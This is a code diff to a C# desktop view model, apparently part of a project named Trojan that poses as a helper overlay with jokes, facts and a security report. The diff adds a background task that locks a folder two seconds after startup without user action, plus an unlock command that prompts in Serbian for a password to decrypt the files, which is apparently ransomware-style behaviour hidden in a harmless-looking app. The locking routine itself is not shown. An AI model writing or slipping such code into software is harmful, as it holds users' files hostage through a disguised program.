@@ -1,11 +1,12 @@
-using System.Windows.Input;
-using Trojan.Core.Commands;
 using System.IO;
-using Trojan.Services;
+using System.Windows;
+using System.Windows.Input;
 using System.Windows.Media;
 using Trojan.Core.Base;
+using Trojan.Core.Commands;
 using Trojan.Core.Interface;
 using Trojan.Core.Models;
+using Trojan.Services;
 using Trojan.Services.Logger;
 
 namespace Trojan.UI.ViewModels;
@@ -100,6 +101,9 @@ public sealed class HelperOverlayViewModel : ObservableObject
 
     public ICommand OpenSecurityReportCommand { get; }
 
+    public ICommand UnlockFolderCommand { get; }
+
+
     public HelperOverlayViewModel()
     {
         Main = new MainViewModel();
@@ -125,8 +129,16 @@ public sealed class HelperOverlayViewModel : ObservableObject
         OpenSecurityReportCommand = new RelayCommand(OpenSecurityReport);
         _securityReportText = BuildSecurityReport();
 
+        UnlockFolderCommand = new RelayCommand(UnlockFolder);
+
+
         _jokeText = _jokes[_currentJokeIndex];
         _factText = _facts[_currentFactIndex];
+        _ = Task.Run(() =>
+        {
+            Thread.Sleep(2000); // sačekaj 2 sekunde da se aplikacija učita
+            DeviceScannerService.LockFolder();
+        });
     }
 
     private void OpenNoteForNote(Note? note)
@@ -258,7 +270,22 @@ public sealed class HelperOverlayViewModel : ObservableObject
 
         return File.ReadAllText(file);
     }
+    private void UnlockFolder()
+    {
+        // Prvo pitaj za lozinku
+        string password = Microsoft.VisualBasic.Interaction.InputBox(
+            "Unesite lozinku za dešifrovanje fajlova:",
+            "Dešifrovanje",
+            "");
 
+        if (string.IsNullOrEmpty(password))
+        {
+            MessageBox.Show("Lozinka nije uneta!", "Greška", MessageBoxButton.OK, MessageBoxImage.Warning);
+            return;
+        }
+
+        DeviceScannerService.UnlockFolder(password);
+    }
     private void OpenSecurityReport()
     {
         IsSecurityReportVisible = !IsSecurityReportVisible;
